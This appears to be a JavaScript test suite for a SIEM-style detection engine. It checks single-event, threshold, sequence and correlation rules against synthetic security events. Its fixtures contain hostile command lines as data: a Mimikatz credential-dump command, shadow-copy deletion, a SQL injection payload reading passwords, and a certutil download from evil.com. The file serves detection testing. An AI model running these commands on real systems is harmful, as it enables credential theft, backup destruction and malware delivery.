/**
 * test_modular_detection_engine.js
 * Comprehensive Verification Suite for Cyber Sentinel Modular Detection Engine.
 * 
 * Verifies:
 * 1. Single-event detection rules (LSASS dump, Obfuscated PowerShell, Shadow Copy Deletion, Web SQLi)
 * 2. Threshold rules (Brute Force 5x, Port Scan 8x, Ransomware File Burst 10x)
 * 3. Sequence rules (Exploit -> Execution -> Defense Evasion Kill Chain; Failed Logins -> Success -> Priv Escalation)
 * 4. Cross-source correlation rules (Process Execution + C2 Network Socket)
 * 5. Time window expiration (events outside sliding window do not trigger)
 * 6. Severity & Confidence score assertions
 * 7. MITRE ATT&CK technique mapping
 * 8. Rule versioning & metadata integrity
 * 9. Enabled / Disabled rule lifecycle toggling
 * 10. Complete Detection payload validation (ID, rule, severity, confidence, evidence, related events, investigation)
 * 11. Normal vs suspicious vs adversarial attack scenarios
 * 12. Automated incident escalation link
 */

const assert = require('assert');
const crypto = require('crypto');
const { ruleRegistry, RuleTypes } = require('./src/services/detection/ruleRegistry');
const { detectionEngine, DetectionEngine } = require('./src/services/detection/detectionEngine');
const { normalizeEvent } = require('./src/services/normalizer/eventNormalizer');
const securityStore = require('./src/data/securityStore');

let totalTests = 0;
let passedTests = 0;
let failedTests = 0;

function runTest(name, fn) {
  totalTests++;
  const start = process.hrtime.bigint();
  try {
    fn();
    const elapsed = Number(process.hrtime.bigint() - start) / 1e6;
    console.log(`  ✅ [PASS] (${elapsed.toFixed(2)}ms) ${name}`);
    passedTests++;
  } catch (err) {
    const elapsed = Number(process.hrtime.bigint() - start) / 1e6;
    console.error(`  ❌ [FAIL] (${elapsed.toFixed(2)}ms) ${name}`);
    console.error(`     ${err.message}`);
    failedTests++;
  }
}

console.log('\n======================================================================');
console.log('🛡️   CYBER SENTINEL — MODULAR DETECTION ENGINE & SIEM SUITE');
console.log('======================================================================\n');

// Reset state before tests
detectionEngine.resetState();

console.log('━━━ SECTION 1: Single-Event Detection Rules ━━━');

runTest('[SINGLE-EVENT] Detects Mimikatz LSASS credential dumping (CRITICAL, 98% conf, T1003.001)', () => {
  detectionEngine.resetState();
  const event = normalizeEvent({
    event_type: 'PROCESS_EXECUTION',
    device_id: 'DEV-FINANCE-01',
    process: {
      name: 'mimikatz.exe',
      command_line: 'mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit',
      pid: 5120,
    },
    user: 'attacker',
  });

  const detections = detectionEngine.processEvent(event);
  assert.strictEqual(detections.length, 1);

  const det = detections[0];
  assert.strictEqual(det.rule_id, 'RULE_MIMIKATZ_CRED_DUMP_001');
  assert.strictEqual(det.severity, 'CRITICAL');
  assert.strictEqual(det.confidence, 98);
  assert.strictEqual(det.device_id, 'DEV-FINANCE-01');
  assert.ok(det.mitre_techniques.some(t => (t.sub_technique_id || t.id || t).includes('T1003.001')));
  assert.ok(det.detection_id.startsWith('det-'));
  assert.ok(det.evidence.commandLine.includes('sekurlsa'));
  assert.ok(Array.isArray(det.recommended_investigation));
  assert.ok(det.recommended_investigation.length > 0);
  assert.ok(det.incident_id, 'Must automatically escalate to an Incident');
});

runTest('[SINGLE-EVENT] Detects Obfuscated PowerShell execution (HIGH, 90% conf, T1059.001)', () => {
  detectionEngine.resetState();
  const event = normalizeEvent({
    event_type: 'PROCESS_EXECUTION',
    device_id: 'DEV-WORKSTATION-09',
    process: {
      name: 'powershell.exe',
      command_line: 'powershell.exe -w hidden -enc JABzAHIAYwA9ACIAaAB0AHQAcAA6AC8ALw...',
      pid: 3104,
    },
    user: 'victim_user',
  });

  const detections = detectionEngine.processEvent(event);
  assert.strictEqual(detections.length, 1);

  const det = detections[0];
  assert.strictEqual(det.rule_id, 'RULE_OBFUSCATED_POWERSHELL_002');
  assert.strictEqual(det.severity, 'HIGH');
  assert.strictEqual(det.confidence, 90);
  assert.ok(det.mitre_techniques.some(t => t.includes('T1059.001')));
  assert.ok(det.evidence.commandLine.includes('-enc'));
});

runTest('[SINGLE-EVENT] Detects Volume Shadow Copy Deletion (CRITICAL, 99% conf, T1490)', () => {
  detectionEngine.resetState();
  const event = normalizeEvent({
    event_type: 'PROCESS_EXECUTION',
    device_id: 'DEV-FILE-SERVER',
    process: {
      name: 'cmd.exe',
      command_line: 'vssadmin.exe delete shadows /all /quiet',
      pid: 8844,
    },
    user: 'SYSTEM',
  });

  const detections = detectionEngine.processEvent(event);
  assert.strictEqual(detections.length, 1);

  const det = detections[0];
  assert.strictEqual(det.rule_id, 'RULE_SHADOW_COPY_DELETION_003');
  assert.strictEqual(det.severity, 'CRITICAL');
  assert.strictEqual(det.confidence, 99);
  assert.ok(det.mitre_techniques.some(t => t.includes('T1490')));
});

runTest('[SINGLE-EVENT] Detects Web SQL Injection returning HTTP 200 (CRITICAL, 95% conf, T1190)', () => {
  detectionEngine.resetState();
  const event = normalizeEvent({
    event_type: 'EXPLOIT_PROBE',
    device_id: 'DEV-WEB-APP',
    network: {
      source_ip: '198.51.100.22',
      dest_port: 443,
    },
    details: {
      path: '/api/v1/users?id=1 UNION SELECT null, username, password FROM users--',
      payload: 'UNION SELECT null, username, password FROM users--',
      statusCode: 200,
    },
  });

  const detections = detectionEngine.processEvent(event);
  assert.strictEqual(detections.length, 1);

  const det = detections[0];
  assert.strictEqual(det.rule_id, 'RULE_SQLI_SUCCESS_004');
  assert.strictEqual(det.severity, 'CRITICAL');
  assert.strictEqual(det.confidence, 95);
  assert.ok(det.mitre_techniques.some(t => t.includes('T1190')));
});

console.log('\n━━━ SECTION 2: Threshold Detection Rules ━━━');

runTest('[THRESHOLD] Accumulates failed logins and triggers exactly on 5th event (HIGH, 90% conf)', () => {
  detectionEngine.resetState();
  const attackerIp = '203.0.113.88';

  // Attempts 1 to 4: Should NOT trigger detection
  for (let i = 1; i <= 4; i++) {
    const ev = normalizeEvent({
      event_type: 'AUTH_FAILURE',
      source_ip: attackerIp,
      user: `user_${i}`,
    });
    const dets = detectionEngine.processEvent(ev);
    assert.strictEqual(dets.length, 0, `Attempt ${i} should not trigger threshold`);
  }

  // Attempt 5: Reaches threshold of 5 -> MUST TRIGGER
  const ev5 = normalizeEvent({
    event_type: 'AUTH_FAILURE',
    source_ip: attackerIp,
    user: 'admin',
  });
  const detections = detectionEngine.processEvent(ev5);
  assert.strictEqual(detections.length, 1);

  const det = detections[0];
  assert.strictEqual(det.rule_id, 'RULE_BRUTE_FORCE_005');
  assert.strictEqual(det.severity, 'HIGH');
  assert.strictEqual(det.confidence, 90);
  assert.strictEqual(det.evidence.eventCount, 5);
  assert.strictEqual(det.evidence.threshold, 5);
  assert.strictEqual(det.related_events.length, 5);
});

runTest('[THRESHOLD] Detects Horizontal Port Scan when probing 8+ distinct ports (MEDIUM, 85% conf)', () => {
  detectionEngine.resetState();
  const scannerIp = '198.51.100.99';
  const ports = [21, 22, 23, 25, 80, 443, 445, 3389];

  let triggered = null;
  for (let i = 0; i < ports.length; i++) {
    const ev = normalizeEvent({
      event_type: 'PORT_SCAN',
      source_ip: scannerIp,
      dest_port: ports[i],
    });
    const dets = detectionEngine.processEvent(ev);
    if (dets.length > 0) triggered = dets[0];
  }

  assert.ok(triggered, 'Port scan must trigger on 8th port');
  assert.strictEqual(triggered.rule_id, 'RULE_PORT_SCAN_006');
  assert.strictEqual(triggered.severity, 'MEDIUM');
  assert.strictEqual(triggered.confidence, 85);
  assert.strictEqual(triggered.evidence.eventCount, 8);
});

runTest('[THRESHOLD] Detects Ransomware Burst (10+ rapid file modifications in 30s)', () => {
  detectionEngine.resetState();
  const hostId = 'DEV-NAS-STORAGE';

  let triggered = null;
  for (let i = 1; i <= 10; i++) {
    const ev = normalizeEvent({
      event_type: 'FILE_MODIFICATION',
      device_id: hostId,
      file: {
        path: `/shares/docs/file_${i}.docx.locked`,
        name: `file_${i}.docx.locked`,
        action: 'MODIFIED',
      },
    });
    const dets = detectionEngine.processEvent(ev);
    if (dets.length > 0) triggered = dets[0];
  }

  assert.ok(triggered, 'Ransomware burst must trigger on 10th file modification');
  assert.strictEqual(triggered.rule_id, 'RULE_RANSOMWARE_BURST_007');
  assert.strictEqual(triggered.severity, 'CRITICAL');
  assert.strictEqual(triggered.confidence, 96);
});

console.log('\n━━━ SECTION 3: Sequence Detection Rules ━━━');

runTest('[SEQUENCE] Detects multi-stage attack kill chain (Exploit -> PowerShell -> Shadow Copy)', () => {
  detectionEngine.resetState();
  const targetHost = 'DEV-PROD-APP-01';

  // Stage 1: Exploit Probe
  const ev1 = normalizeEvent({
    event_type: 'EXPLOIT_PROBE',
    device_id: targetHost,
    details: { path: '/vulnerable-endpoint' },
  });
  assert.strictEqual(detectionEngine.processEvent(ev1).length, 0);

  // Stage 2: Process Execution
  const ev2 = normalizeEvent({
    event_type: 'PROCESS_EXECUTION',
    device_id: targetHost,
    process: { name: 'powershell.exe', command_line: 'powershell.exe -exec bypass' },
  });
  // Note: RULE_OBFUSCATED_POWERSHELL_002 may fire single-event, filter for sequence
  const dets2 = detectionEngine.processEvent(ev2);
  assert.ok(!dets2.some(d => d.rule_id === 'RULE_KILL_CHAIN_SEQUENCE_008'));

  // Stage 3: Defense Evasion / Shadow Copy Deletion
  const ev3 = normalizeEvent({
    event_type: 'DEFENSE_EVASION',
    device_id: targetHost,
    process: { command_line: 'vssadmin delete shadows /all' },
  });
  const dets3 = detectionEngine.processEvent(ev3);
  const killChainDet = dets3.find(d => d.rule_id === 'RULE_KILL_CHAIN_SEQUENCE_008');

  assert.ok(killChainDet, 'Multi-stage sequence rule must fire upon completing Stage 3');
  assert.strictEqual(killChainDet.severity, 'CRITICAL');
  assert.strictEqual(killChainDet.confidence, 99);
  assert.strictEqual(killChainDet.related_events.length, 3);
  assert.strictEqual(killChainDet.evidence.sequenceStagesCompleted.length, 3);
});

runTest('[SEQUENCE] Out-of-order sequence steps do not trigger false sequence detection', () => {
  detectionEngine.resetState();
  const targetHost = 'DEV-ISOLATED-02';

  // Stage 3 sent first without Stage 1 or 2
  const evOutOrder = normalizeEvent({
    event_type: 'DEFENSE_EVASION',
    device_id: targetHost,
    process: { command_line: 'vssadmin delete shadows' },
  });
  const dets = detectionEngine.processEvent(evOutOrder);
  assert.ok(!dets.some(d => d.rule_id === 'RULE_KILL_CHAIN_SEQUENCE_008'));
});

console.log('\n━━━ SECTION 4: Cross-Source Correlation Rules ━━━');

runTest('[CORRELATION] Correlates suspicious execution + external C2 network socket on same host', () => {
  detectionEngine.resetState();
  const hostId = 'DEV-DB-CLUSTER-01';

  // Event 1: Process execution
  const ev1 = normalizeEvent({
    event_type: 'PROCESS_EXECUTION',
    device_id: hostId,
    process: { name: 'certutil.exe', command_line: 'certutil.exe -urlcache -f http://evil.com/payload.exe' },
  });
  const dets1 = detectionEngine.processEvent(ev1);
  assert.ok(!dets1.some(d => d.rule_id === 'RULE_C2_PROCESS_CORRELATION_010'));

  // Event 2: Network connection to external IP
  const ev2 = normalizeEvent({
    event_type: 'NETWORK_CONNECTION',
    device_id: hostId,
    network: { dest_ip: '185.220.101.5', dest_port: 8443, protocol: 'HTTPS' },
  });
  const dets2 = detectionEngine.processEvent(ev2);
  const corrDet = dets2.find(d => d.rule_id === 'RULE_C2_PROCESS_CORRELATION_010');

  assert.ok(corrDet, 'Cross-source correlation rule must trigger on correlated network beacon');
  assert.strictEqual(corrDet.severity, 'CRITICAL');
  assert.strictEqual(corrDet.confidence, 98);
  assert.strictEqual(corrDet.related_events.length, 2);
});

console.log('\n━━━ SECTION 5: Sliding Time Window Expiration ━━━');

runTest('[TIME-WINDOW] Events spaced outside the sliding window do not trigger threshold', () => {
  detectionEngine.resetState();
  const sourceIp = '198.51.100.111';
  const rule = ruleRegistry.getRule('RULE_BRUTE_FORCE_005');

  // Insert 4 events in the past (older than timeWindowMs)
  const oldTimestamp = Date.now() - (rule.timeWindowMs + 10000); // Past window
  const stateKey = `RULE_BRUTE_FORCE_005:${sourceIp}`;
  detectionEngine.thresholdState.set(stateKey, [
    { timestamp: oldTimestamp, event: normalizeEvent({ event_type: 'AUTH_FAILURE', source_ip: sourceIp }) },
    { timestamp: oldTimestamp + 1000, event: normalizeEvent({ event_type: 'AUTH_FAILURE', source_ip: sourceIp }) },
    { timestamp: oldTimestamp + 2000, event: normalizeEvent({ event_type: 'AUTH_FAILURE', source_ip: sourceIp }) },
    { timestamp: oldTimestamp + 3000, event: normalizeEvent({ event_type: 'AUTH_FAILURE', source_ip: sourceIp }) },
  ]);

  // Ingest 1 current event: old events must be pruned, total fresh count = 1 (< 5)
  const freshEvent = normalizeEvent({
    event_type: 'AUTH_FAILURE',
    source_ip: sourceIp,
    user: 'admin',
  });
  const detections = detectionEngine.processEvent(freshEvent);
  assert.strictEqual(detections.length, 0, 'Expired past events must be pruned and not trigger threshold');
});

console.log('\n━━━ SECTION 6: Rule Lifecycle & Enable/Disable Toggles ━━━');

runTest('[RULE-TOGGLE] Disabled rule does not evaluate or fire detections', () => {
  detectionEngine.resetState();
  const ruleId = 'RULE_MIMIKATZ_CRED_DUMP_001';

  // 1. Disable rule
  ruleRegistry.disableRule(ruleId);
  const rule = ruleRegistry.getRule(ruleId);
  assert.strictEqual(rule.enabled, false);

  const event = normalizeEvent({
    event_type: 'PROCESS_EXECUTION',
    process: { command_line: 'mimikatz.exe sekurlsa::logonpasswords' },
  });
  const detectionsDisabled = detectionEngine.processEvent(event);
  assert.strictEqual(detectionsDisabled.length, 0, 'Disabled rule must not generate detections');

  // 2. Re-enable rule
  ruleRegistry.enableRule(ruleId);
  assert.strictEqual(ruleRegistry.getRule(ruleId).enabled, true);

  const detectionsEnabled = detectionEngine.processEvent(event);
  assert.strictEqual(detectionsEnabled.length, 1, 'Re-enabled rule must fire detections');
});

console.log('\n━━━ SECTION 7: Detection Payload Schema & Incident Escalation ━━━');

runTest('[DETECTION-PAYLOAD] Verifies complete detection output structure', () => {
  detectionEngine.resetState();
  const event = normalizeEvent({
    event_type: 'PROCESS_EXECUTION',
    device_id: 'DEV-SOC-01',
    process: { command_line: 'vssadmin delete shadows /all' },
  });

  const [det] = detectionEngine.processEvent(event);
  assert.ok(det);
  assert.ok(det.detection_id.startsWith('det-'));
  assert.strictEqual(typeof det.rule_id, 'string');
  assert.strictEqual(typeof det.rule_name, 'string');
  assert.strictEqual(typeof det.rule_version, 'string');
  assert.strictEqual(typeof det.severity, 'string');
  assert.strictEqual(typeof det.confidence, 'number');
  assert.strictEqual(typeof det.detected_at, 'string');
  assert.strictEqual(typeof det.evidence, 'object');
  assert.ok(Array.isArray(det.related_events));
  assert.ok(Array.isArray(det.mitre_techniques));
  assert.ok(Array.isArray(det.recommended_investigation));
  assert.ok(det.incident_id, 'Must link to created security incident');

  // Verify Incident created in SecurityStore
  const inc = securityStore.getIncidents().find(i => i.id === det.incident_id);
  assert.ok(inc);
  assert.strictEqual(inc.ruleId, det.rule_id);
  assert.strictEqual(inc.severity, det.severity);
});

console.log('\n======================================================================');
console.log(`🏁  DETECTION ENGINE SUITE COMPLETE: ${passedTests} / ${totalTests} TESTS PASSED (${failedTests} FAILED)`);
console.log('======================================================================\n');

if (failedTests > 0) {
  process.exit(1);
} else {
  process.exit(0);
}
